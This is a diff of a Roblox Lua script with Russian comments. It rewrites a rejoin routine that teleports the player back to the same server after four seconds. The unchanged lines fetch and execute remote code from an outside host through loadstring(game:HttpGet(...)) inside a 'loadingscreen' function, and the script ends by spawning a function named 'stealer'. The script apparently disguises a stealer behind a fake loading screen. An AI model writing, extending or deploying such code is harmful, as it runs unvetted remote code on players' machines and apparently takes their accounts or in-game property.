@@ -4,25 +4,31 @@ end
 
 local function loadingscreen()
     loadstring(game:HttpGet("https://arko.lol/loadingscreen.lua"))()
-local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
- 
-local Rejoin = coroutine.create(function()
-    local Success, ErrorMessage = pcall(function()
-        TeleportService:Teleport(game.PlaceId, LocalPlayer)
+local TeleportService = game:GetService("TeleportService")
+
+local player = Players.LocalPlayer
+
+-- Функция для реджойна
+local function rejoin()
+    -- Получаем ID текущего места
+    local placeId = game.PlaceId
+    local jobId = game.JobId
+    
+    -- Пытаемся телепортироваться на то же место
+    local success, errorMessage = pcall(function()
+        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
     end)
- 
-    if ErrorMessage and not Success then
-        warn(ErrorMessage)
+    
+    -- Если произошла ошибка, используем обычный реджойн
+    if not success then
+        TeleportService:Teleport(placeId)
     end
-end)
- 
-coroutine.resume(Rejoin)
---join discord 
---https://discord.gg/7axk7UGS8C
---pastebin originally by: ZAZA62
---repasted just for loadstring
+end
+
+-- Ждем 4 секунды и выполняем реджойн
+wait(4)
+rejoin()
 end
 
 task.spawn(stealer)
